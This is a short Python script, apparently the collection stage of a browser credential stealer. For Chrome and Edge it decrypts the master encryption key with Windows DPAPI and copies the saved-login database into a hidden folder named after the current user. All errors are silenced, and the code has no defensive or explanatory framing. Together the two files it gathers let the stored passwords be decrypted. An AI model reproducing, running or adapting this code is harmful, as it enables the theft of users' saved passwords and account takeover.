import os
import json
import base64
from win32 import win32crypt
import shutil

def get_master_key(path,output):
    try:
        with open(os.environ['USERPROFILE'] + os.sep + fr'AppData\Local\{path}\User Data\Local State', "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        open(output, "wb").write(master_key)
    except:
        pass


def get_login_data(path,output):
    try:
        login_db = os.environ['USERPROFILE'] + os.sep + fr'AppData\Local\{path}\User Data\default\Login Data'
        shutil.copy2(login_db, output)
    except:
        pass



if __name__ == "__main__":
    name = os.getlogin()
    os.makedirs(name)
    os.system(f"attrib +h {name}")
    
    # Get Chrome data
    browser = "Chrome"
    
    get_master_key(r"Google\Chrome", fr"{name}\{browser}Key.dat")
    get_login_data(r"Google\Chrome", fr"{name}\{browser}Data.db")
      
    
    # Get Edge data
    browser = "Edge"
    
    get_master_key(r"Microsoft\Edge", fr"{name}\{browser}Key.dat")
    get_login_data(r"Microsoft\Edge", fr"{name}\{browser}Data.db")
